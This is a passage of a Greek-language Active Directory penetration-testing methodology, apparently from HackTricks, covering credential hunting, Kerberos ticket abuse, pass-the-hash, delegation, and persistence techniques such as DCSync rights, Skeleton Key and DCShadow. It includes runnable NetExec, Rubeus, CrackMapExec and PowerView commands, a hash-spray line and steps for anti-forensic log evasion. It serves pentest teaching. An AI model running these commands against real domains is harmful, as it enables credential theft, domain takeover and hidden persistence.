- Μπορείς επίσης να κάνεις αναζήτηση στη βάση δεδομένων LDAP με το **ldapsearch** για credentials στα πεδία _userPassword_ και _unixUserPassword_, ή ακόμη και στις σημειώσεις _description_ και _info_ των χρηστών. Ένα μη επισημασμένο token στο _info_ που μοιάζει με κωδικό πρόσβασης είναι απλώς υποψήφιο στοιχείο: επιβεβαίωσε ξεχωριστά τον σκοπό και την εγκυρότητά του και μην εμφανίζεις το περιεχόμενο των σημειώσεων στα συνήθη αποτελέσματα enumeration. Δες το [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) για άλλες μεθόδους.
- Έλεγξε τα **προσβάσιμα** scripts σύνδεσης domain και αντιστοίχισης μονάδων δίσκου στις τοποθεσίες `\\<dc>\NETLOGON` ή `\\<dc>\SYSVOL\<domain>\scripts`, όταν το επιτρέπουν τα δικαιώματά σου. Η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) τον ρόλο του share NETLOGON ως καταλόγου scripts. Αρχικά, κατέγραψε τα ονόματα και, στη συνέχεια, έλεγξε μόνο τα σχετικά scripts στα οποία έχεις δικαίωμα ανάγνωσης, τηρώντας όριο μεγέθους. Μην κάνεις dump ολόκληρο το share και μην εμφανίζεις τιμές credentials κατά το συνηθισμένο enumeration. Μια κλήση PowerShell στο [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **δεν** προστατεύει έναν κυριολεκτικό κωδικό πρόσβασης που είναι αποθηκευμένος στο script. Η κλήση από μόνη της δεν αποδεικνύει ότι υπάρχει hardcoded secret: εντόπισε την πραγματική είσοδό της και, στη συνέχεια, επαλήθευσε ξεχωριστά το account, την εγκυρότητα των credentials και τα δικαιώματα. Ο έλεγχος ενός domain script σε remote share είναι ξεχωριστός από την απαρίθμηση του τοπικού host.
- Αν χρησιμοποιείς **Linux**, μπορείς επίσης να κάνεις enumeration του domain με το [**pywerview**](https://github.com/the-useless-one/pywerview).
- Μπορείς επίσης να δοκιμάσεις αυτοματοποιημένα εργαλεία όπως:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Εξαγωγή όλων των domain users**

  Είναι πολύ εύκολο να λάβεις όλα τα domain usernames από Windows (`net user /domain` ,`Get-DomainUser` ή `wmic useraccount get name,sid`). Στο Linux, μπορείς να χρησιμοποιήσεις: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ή `enum4linux -a -u "user" -p "password" <DC IP>`

> Ακόμη κι αν αυτή η ενότητα για το Enumeration φαίνεται σύντομη, είναι το σημαντικότερο μέρος απ’ όλα. Άνοιξε τους συνδέσμους (κυρίως αυτούς για cmd, powershell, powerview και BloodHound), μάθε πώς να κάνεις enumeration ενός domain και εξασκήσου μέχρι να νιώθεις άνετα. Κατά τη διάρκεια μιας αξιολόγησης, αυτή είναι η κρίσιμη στιγμή για να βρεις τη διαδρομή προς DA ή να αποφασίσεις ότι δεν μπορεί να γίνει τίποτα.

### Προβλέψιμα προδημιουργημένα computer accounts -> πρόσβαση στον κωδικό πρόσβασης gMSA

Τα computer accounts που δημιουργήθηκαν εκ των προτέρων για παλαιότερες συνδέσεις μπορεί να διατηρούν έναν προβλέψιμο αρχικό κωδικό πρόσβασης. Το module `pre2k` του NetExec εντοπίζει τη χαρακτηριστική τιμή `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) και επιχειρεί να λάβει Kerberos TGT χρησιμοποιώντας τους πρώτους 14 χαρακτήρες του ονόματος του computer σε πεζά, χωρίς το τελικό `$`. Αντιμετώπισε αυτή την τιμή UAC ως κριτήριο επιλογής υποψηφίων και μην υποθέτεις ότι η συμμετοχή στην ομάδα **Pre-Windows 2000 Compatible Access** από μόνη της αποδεικνύει ότι ο κωδικός πρόσβασης είναι αδύναμος.<sup>[[18]](#references)[[20]](#references)</sup>

Χρησιμοποίησε authenticated LDAP enumeration για να ελέγξεις τους υποψηφίους και να αποθηκεύσεις τα TGT που αποκτήθηκαν επιτυχώς. Η επιλογή `ALL=True` επεκτείνει τον έλεγχο πέρα από τα αντικείμενα που αντιστοιχούν στο προεπιλεγμένο φίλτρο `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Μια αποτυχημένη σύνδεση default/NTLM **δεν** ακυρώνει αυτό το εύρημα: δοκιμάστε με `-k`, ένα FQDN που επιλύεται στον DC και ένα ρολόι συγχρονισμένο με το KDC. Οι επιτυχημένες εκτελέσεις του module γράφουν λίστες υποψηφίων και αποκτημένα ccaches κάτω από το `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Αφού παραβιάσετε το computer principal, χαρτογραφήστε τις ένθετες συμμετοχές του σε ομάδες και τα εξερχόμενα δικαιώματά του. Ειδικότερα, οι principals που αναφέρονται στο security descriptor `msDS-GroupMSAMembership` ενός gMSA μπορούν να διαβάσουν το `msDS-ManagedPassword`· η έξοδος της επιλογής `--gmsa` του NetExec εμφανίζει τους εξουσιοδοτημένους principals και επιστρέφει το τρέχον NT hash, όταν το computer που πραγματοποιεί την αυθεντικοποίηση είναι εξουσιοδοτημένο.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Στη συνέχεια, αξιολόγησε το ανακτημένο gMSA όπως κάθε άλλο διαπιστευτήριο: εξέτασε τη συμμετοχή σε τοπικές/τομεακές ομάδες, τα δικαιώματα σύνδεσης, τα SPN, την ανάθεση και τις προσβάσιμες υπηρεσίες πριν δοκιμάσεις pass-the-hash. Αυτή η διαδρομή ανάκτησης μέσω ACL διαφέρει από το [Golden gMSA/dMSA](golden-dmsa-gmsa.md), το οποίο αντλεί διαχειριζόμενους κωδικούς πρόσβασης μετά την παραβίαση του KDS root key.<sup>[[20]](#references)</sup>

Μια αρχή υπολογιστή μπορεί επίσης να έχει εξερχόμενο έλεγχο σε άλλα αντικείμενα υπολογιστών ή ομάδες. Αφού αποκτήσεις πρόσβαση σε μία, εξέτασε ξεχωριστά τις ένθετες συμμετοχές της και τα αποτελεσματικά ACL: ένα δικαίωμα εγγραφής σε άλλο αντικείμενο υπολογιστή μπορεί να επιτρέψει την αλλαγή λογαριασμού, ενώ τα δικαιώματα συμμετοχής σε ομάδα μπορεί να οδηγήσουν σε ρόλο σύνδεσης. Μια σημαία staged-account, μια προβλέψιμη σύμβαση ονοματοδοσίας ή μια ακμή `GenericWrite` από μόνη της δεν αποδεικνύει ολόκληρη τη διαδρομή.

Ένα αναγνώσιμο αντίγραφο ενός blob `msDS-ManagedPassword` σε αρχείο, share ή backup αποτελεί ξεχωριστή διαδρομή έκθεσης: το ACL ανάγνωσης LDAP δεν μπορεί να προστατεύσει ένα αντίγραφο που είναι αποθηκευμένο αλλού. Επιβεβαίωσε ότι τα δεδομένα είναι blob διαχειριζόμενου κωδικού πρόσβασης πριν τα ερμηνεύσεις και ξεχώρισε αυτή την περίπτωση τόσο από μια εξουσιοδοτημένη ανάγνωση LDAP όσο και από την παραγωγή κωδικών μέσω του KDS root key.

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από υπηρεσίες συνδεδεμένες με λογαριασμούς χρηστών και το σπάσιμο της κρυπτογράφησής τους —η οποία βασίζεται σε κωδικούς πρόσβασης χρηστών— **offline**.

Περισσότερα σχετικά με αυτό στο:


{{#ref}}
kerberoast.md
{{#endref}}

### Απομακρυσμένη σύνδεση (RDP, SSH, FTP, Win-RM κ.λπ.)

Αφού αποκτήσεις κάποια διαπιστευτήρια, μπορείς να ελέγξεις αν έχεις πρόσβαση σε κάποιο **μηχάνημα**. Για τον σκοπό αυτό, μπορείς να χρησιμοποιήσεις το **CrackMapExec** για να επιχειρήσεις σύνδεση σε πολλούς servers με διαφορετικά πρωτόκολλα, ανάλογα με τις σαρώσεις θυρών σου.

### Κλιμάκωση τοπικών προνομίων

Αν έχεις παραβιασμένα διαπιστευτήρια ή μια συνεδρία ως κανονικός χρήστης τομέα και μπορείς να αποκτήσεις πρόσβαση σε **οποιοδήποτε μηχάνημα στον τομέα**, αναζήτησε τρόπο να **κλιμακώσεις τοπικά τα προνόμιά σου και να συλλέξεις διαπιστευτήρια**. Τα προνόμια τοπικού διαχειριστή μπορεί να σου επιτρέψουν να **κάνεις dump τα hashes άλλων χρηστών** από τη μνήμη (LSASS) και τον τοπικό χώρο αποθήκευσης (SAM).

Αυτό το βιβλίο περιλαμβάνει μια πλήρη σελίδα για την [**κλιμάκωση τοπικών προνομίων στα Windows**](../windows-local-privilege-escalation/index.html) και μια [**λίστα ελέγχου**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσεις να χρησιμοποιήσεις το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets τρέχουσας συνεδρίας

Είναι πολύ **απίθανο** να βρεις **tickets** στον τρέχοντα χρήστη που να σου **δίνουν δικαίωμα πρόσβασης** σε απρόσμενους πόρους, αλλά μπορείς να ελέγξεις:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Με διαπιστευτήρια domain ή με συνεδρία χρήστη, εξετάστε ξανά τις [**επιθέσεις relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): οι τεχνικές authenticated enumeration και εξαναγκασμού μπορούν να αποκαλύψουν διαδρομές relay που δεν ήταν διαθέσιμες κατά την αναγνώριση χωρίς authentication.

### Αναζήτηση διαπιστευτηρίων σε κοινόχρηστους υπολογιστές | SMB Shares

Τώρα που έχετε κάποια βασικά διαπιστευτήρια, πρέπει να ελέγξετε αν μπορείτε να **βρείτε** ενδιαφέροντα αρχεία που είναι κοινόχρηστα στο AD. Μπορείτε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή και επαναλαμβανόμενη εργασία (ειδικά αν βρείτε εκατοντάδες έγγραφα που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε ποια εργαλεία μπορείτε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλοπή NTLM Creds

Αν μπορείτε να **αποκτήσετε πρόσβαση σε άλλους υπολογιστές ή shares**, μπορείτε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) που, αν προσπελαστούν με κάποιον τρόπο, θα **προκαλέσουν authentication NTLM εναντίον σας**, ώστε να **κλέψετε** το **NTLM challenge** και να το σπάσετε:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated χρήστη να **παραβιάσει τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Κλιμάκωση προνομίων στο Active Directory ΜΕ προνομιούχα διαπιστευτήρια/συνεδρία

**Για τις ακόλουθες τεχνικές δεν αρκεί ένας απλός χρήστης domain· χρειάζεστε ειδικά προνόμια/διαπιστευτήρια για να εκτελέσετε αυτές τις επιθέσεις.**

### Εξαγωγή hash

Ας ελπίσουμε ότι καταφέρατε να **παραβιάσετε κάποιον τοπικό λογαριασμό διαχειριστή** χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [κλιμάκωση προνομίων τοπικά](../windows-local-privilege-escalation/index.html).\
Έπειτα, είναι ώρα να κάνετε dump όλων των hash από τη μνήμη και τοπικά.\
[**Διαβάστε αυτήν τη σελίδα για τους διάφορους τρόπους απόκτησης των hash.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσετε το hash ενός χρήστη**, μπορείτε να το χρησιμοποιήσετε για να **προσποιηθείτε ότι είστε αυτός**.\
Πρέπει να χρησιμοποιήσετε κάποιο **εργαλείο** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** μπορείτε να δημιουργήσετε ένα νέο **sessionlogon** και να **εισαγάγετε** αυτό το **hash** στο **LSASS**, ώστε να χρησιμοποιείται αυτό το **hash όταν εκτελείται οποιοδήποτε NTLM authentication**. Αυτό κάνει η mimikatz στην τελευταία περίπτωση.\
[**Διαβάστε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η επίθεση στοχεύει στη **χρήση του NTLM hash του χρήστη για αίτηση εισιτηρίων Kerberos**, ως εναλλακτική στη συνηθισμένη χρήση του Pass The Hash μέσω του πρωτοκόλλου NTLM. Επομένως, μπορεί να είναι ιδιαίτερα **χρήσιμη σε δίκτυα όπου το πρωτόκολλο NTLM είναι απενεργοποιημένο** και επιτρέπεται μόνο το **Kerberos** ως πρωτόκολλο authentication.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο επίθεσης **Pass The Ticket (PTT)**, οι επιτιθέμενοι **κλέβουν ένα εισιτήριο authentication χρήστη** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Στη συνέχεια, αυτό το κλεμμένο εισιτήριο χρησιμοποιείται για να **προσποιηθούν ότι είναι ο χρήστης**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε πόρους και υπηρεσίες μέσα σε ένα δίκτυο.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Επαναχρησιμοποίηση διαπιστευτηρίων

Αν έχετε το **hash** ή τον **κωδικό πρόσβασης** ενός **τοπικού διαχειριστή**, πρέπει να δοκιμάσετε να **συνδεθείτε τοπικά** σε άλλους **υπολογιστές** με αυτά.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **μετρίαζε**.

### Κατάχρηση MSSQL και έμπιστοι σύνδεσμοι

Αν ένας χρήστης έχει δικαιώματα **πρόσβασης σε instances MSSQL**, ενδέχεται να μπορεί να **εκτελέσει εντολές** στον host του MSSQL (αν εκτελείται ως SA), να **κλέψει** το **hash** NetNTLM ή ακόμη και να πραγματοποιήσει **relay attack**.\
Αν ένα instance MSSQL είναι έμπιστο μέσω database link από κάποιο άλλο instance, ένας χρήστης με δικαιώματα στη συνδεδεμένη βάση δεδομένων ενδέχεται να μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει ερωτήματα στο άλλο instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να συνδεθούν μεταξύ τους και ενδέχεται τελικά να οδηγήσουν σε μια εσφαλμένα ρυθμισμένη βάση δεδομένων, όπου ο χρήστης μπορεί να εκτελέσει εντολές.\
**Οι σύνδεσμοι μεταξύ βάσεων δεδομένων λειτουργούν ακόμη και μέσω forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Κατάχρηση πλατφορμών IT asset/deployment

Οι σουίτες inventory και deployment τρίτων συχνά εκθέτουν ισχυρές οδούς πρόσβασης σε credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Αν εντοπίσετε οποιοδήποτε αντικείμενο Computer με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε δικαιώματα domain στον υπολογιστή, θα μπορείτε να κάνετε dump τα TGTs από τη μνήμη όλων των χρηστών που συνδέονται στον υπολογιστή.\
Επομένως, αν ένας **Domain Admin συνδεθεί στον υπολογιστή**, θα μπορείτε να κάνετε dump το TGT του και να τον υποδυθείτε χρησιμοποιώντας το [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation, θα μπορούσατε ακόμη και να **παραβιάσετε αυτόματα έναν Print Server** (ελπίζουμε να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής επιτρέπεται για "Constrained Delegation", θα μπορεί να **υποδυθεί οποιονδήποτε χρήστη για να αποκτήσει πρόσβαση σε ορισμένες υπηρεσίες ενός υπολογιστή**.\
Έπειτα, αν **παραβιάσετε το hash** αυτού του χρήστη/υπολογιστή, θα μπορείτε να **υποδυθείτε οποιονδήποτε χρήστη** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε ορισμένες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή δικαιώματος **WRITE** σε ένα αντικείμενο Active Directory ενός απομακρυσμένου υπολογιστή επιτρέπει την απόκτηση code execution με **αυξημένα δικαιώματα**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Κατάχρηση Permissions/ACLs

Ο παραβιασμένος χρήστης ενδέχεται να έχει ορισμένα **ενδιαφέροντα δικαιώματα σε αντικείμενα του domain**, τα οποία θα μπορούσαν να σας επιτρέψουν να κινηθείτε πλευρικά ή να **κλιμακώσετε** τα δικαιώματά σας.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Κατάχρηση της υπηρεσίας Printer Spooler

Ο εντοπισμός μιας **υπηρεσίας Spool που ακούει** μέσα στο domain μπορεί να γίνει αντικείμενο **κατάχρησης** για την **απόκτηση νέων credentials** και την **κλιμάκωση δικαιωμάτων**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Κατάχρηση sessions τρίτων

Αν **άλλοι χρήστες** **αποκτούν πρόσβαση** στο **παραβιασμένο** μηχάνημα, είναι δυνατό να **συλλέξετε credentials από τη μνήμη** και ακόμη και να **εισάγετε beacons στις διεργασίες τους** για να τους υποδυθείτε.\
Συνήθως οι χρήστες αποκτούν πρόσβαση στο σύστημα μέσω RDP, οπότε εδώ θα βρείτε πώς να εκτελέσετε μερικές επιθέσεις σε RDP sessions τρίτων:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα διαχείρισης του **κωδικού πρόσβασης του τοπικού Administrator** σε υπολογιστές ενταγμένους σε domain, διασφαλίζοντας ότι είναι **τυχαίος**, μοναδικός και **αλλάζει** συχνά. Αυτοί οι κωδικοί πρόσβασης αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs, ώστε να επιτρέπεται μόνο σε εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα πρόσβασης σε αυτούς τους κωδικούς πρόσβασης, είναι δυνατή η μετάβαση σε άλλους υπολογιστές.


{{#ref}}
laps.md
{{#endref}}

### Κλοπή πιστοποιητικών

Η **συλλογή πιστοποιητικών** από το παραβιασμένο μηχάνημα θα μπορούσε να αποτελέσει τρόπο κλιμάκωσης δικαιωμάτων στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Κατάχρηση Certificate Templates

Αν έχουν ρυθμιστεί **ευάλωτα templates**, είναι δυνατό να γίνει κατάχρησή τους για την κλιμάκωση δικαιωμάτων:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με λογαριασμό υψηλών δικαιωμάτων

### Dumping credentials του domain

Μόλις αποκτήσετε δικαιώματα **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** τη **βάση δεδομένων του domain**: _ntds.dit_.

[**Μπορείτε να βρείτε περισσότερες πληροφορίες για την επίθεση DCSync εδώ**](dcsync.md).

[**Μπορείτε να βρείτε περισσότερες πληροφορίες για το πώς να κλέψετε το NTDS.dit εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Ένα αναγνώσιμο εφεδρικό αρχείο που περιέχει το `ntds.dit` μαζί με το hive `SYSTEM` θα πρέπει να αντιμετωπίζεται ως εκτεθειμένο υλικό καταλόγου ακόμη και πριν από την εξαγωγή του. Ένα παλιό password hash δεν σημαίνει ότι τα υπόλοιπα attributes του αντικειμένου είναι ασφαλή: πεδία όπως το `description` μπορεί να περιέχουν credentials ή λειτουργικές σημειώσεις. Ελέγξτε πρώτα τα ονόματα των μελών του αρχείου και μην αφήνετε τα περιεχόμενα της εξαγόμενης βάσης δεδομένων να εμφανίζονται σε συνηθισμένα αποτελέσματα enumeration.

### Privesc ως Persistence

Ορισμένες από τις τεχνικές που αναφέρθηκαν παραπάνω μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους χρήστες ευάλωτους στο [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Καθιστά τους χρήστες ευάλωτους στο [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Εκχώρηση δικαιωμάτων [**DCSync**](#dcsync) σε έναν χρήστη

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **νόμιμο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του λογαριασμού του PC**). Αυτή η μέθοδος χρησιμοποιείται για **πρόσβαση στα προνόμια της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Η **Golden Ticket attack** περιλαμβάνει την απόκτηση από έναν attacker του **NTLM hash του λογαριασμού krbtgt** σε ένα περιβάλλον Active Directory (AD). Αυτός ο λογαριασμός είναι ειδικός, επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για την αυθεντικοποίηση μέσα στο δίκτυο AD.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets, αλλά είναι πλαστογραφημένα με τρόπο που **παρακάμπτει τους συνήθεις μηχανισμούς εντοπισμού golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence λογαριασμού με Certificates**

**Η κατοχή certificates ενός λογαριασμού ή η δυνατότητα να τα ζητήσεις** είναι ένας πολύ καλός τρόπος για να διατηρήσεις persistence στον λογαριασμό ενός χρήστη (ακόμα κι αν αλλάξει τον κωδικό πρόσβασής του):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence domain με Certificates**

**Η χρήση certificates επιτρέπει επίσης τη διατήρηση persistence με υψηλά προνόμια μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory διασφαλίζει την προστασία των **privileged groups** (όπως τα Domain Admins και Enterprise Admins), εφαρμόζοντας ένα τυπικό **Access Control List (ACL)** σε αυτές τις ομάδες, ώστε να αποτρέπονται μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να γίνει αντικείμενο εκμετάλλευσης: αν ένας attacker τροποποιήσει το ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν απλό χρήστη, αυτός αποκτά εκτεταμένο έλεγχο σε όλα τα privileged groups. Έτσι, αυτό το μέτρο ασφαλείας, που προορίζεται να παρέχει προστασία, μπορεί να έχει το αντίθετο αποτέλεσμα και να επιτρέψει μη εξουσιοδοτημένη πρόσβαση, αν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες για το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Αν αποκτήσεις δικαιώματα administrator σε ένα τέτοιο μηχάνημα, μπορείς να εξαγάγεις το hash του local Administrator χρησιμοποιώντας το **mimikatz**. Στη συνέχεια, χρειάζεται μια τροποποίηση στο registry για να **ενεργοποιηθεί η χρήση αυτού του κωδικού πρόσβασης**, επιτρέποντας την απομακρυσμένη πρόσβαση στον λογαριασμό local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείς να **παραχωρήσεις** **ειδικά δικαιώματα** σε έναν **χρήστη** πάνω σε συγκεκριμένα αντικείμενα domain, τα οποία θα του επιτρέψουν να **κλιμακώσει τα προνόμιά του στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για την **αποθήκευση** των **δικαιωμάτων** που έχει ένα **αντικείμενο** πάνω σε ένα **αντικείμενο**. Αν μπορέσεις να κάνεις απλώς μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείς να αποκτήσεις πολύ ενδιαφέροντα προνόμια πάνω σε αυτό, χωρίς να χρειάζεται να είσαι μέλος ενός privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Κάνε κατάχρηση της βοηθητικής κλάσης `dynamicObject` για να δημιουργήσεις βραχύβιες principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`. Αυτά διαγράφονται αυτόματα χωρίς tombstones, σβήνοντας τα αποδεικτικά στοιχεία LDAP, ενώ αφήνουν orphan SIDs, broken αναφορές `gPLink` ή cached DNS responses (π.χ. ρύπανση ACE του AdminSDHolder ή κακόβουλες ανακατευθύνσεις `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποίησε το **LSASS** στη μνήμη για να ορίσεις έναν **universal password**, παρέχοντας πρόσβαση σε όλους τους λογαριασμούς domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθε εδώ τι είναι ένα SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείς να δημιουργήσεις το **δικό σου SSP** για να **συλλαμβάνεις** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο μηχάνημα.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **προωθεί attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα, **χωρίς** να αφήνει **logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεσαι προνόμια **DA** και πρέπει να βρίσκεσαι μέσα στο **root domain**.\
Σημείωσε ότι αν χρησιμοποιήσεις λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να κλιμακώσεις προνόμια αν έχεις **επαρκή δικαιώματα για να διαβάσεις κωδικούς πρόσβασης LAPS**. Ωστόσο, αυτοί οι κωδικοί πρόσβασης μπορούν επίσης να χρησιμοποιηθούν για τη **διατήρηση persistence**.\
Δες:


{{#ref}}
laps.md
{{#endref}}

## Κλιμάκωση προνομίων στο Forest - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το όριο ασφαλείας. Αυτό σημαίνει ότι **η παραβίαση ενός domain θα μπορούσε δυνητικά να οδηγήσει στην παραβίαση ολόκληρου του Forest**.<sup>[[1]](#references)</sup>

### Βασικές πληροφορίες

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν χρήστη από ένα **domain** να έχει πρόσβαση σε πόρους ενός άλλου **domain**. Ουσιαστικά, δημιουργεί μια σύνδεση ανάμεσα στα συστήματα αυθεντικοποίησης των δύο domains, επιτρέποντας την απρόσκοπτη μεταφορά των ελέγχων αυθεντικοποίησης. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

